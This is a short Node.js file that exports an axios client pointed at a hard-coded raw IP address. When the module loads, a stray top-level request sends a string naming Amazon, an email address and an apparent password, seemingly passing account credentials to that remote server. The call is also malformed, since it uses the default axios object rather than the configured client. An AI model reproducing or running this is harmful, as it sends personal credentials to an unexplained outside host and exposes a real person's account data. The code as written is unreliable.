const axios = require('axios');

module.exports = () => {
	return axios.create({
		baseURL: 'http://216.158.239.199:3000/',
		timeout: 1000,
	});
}

axios.get('/error?check/amazon:jordan.s@use.startmail.com:jordan.s')
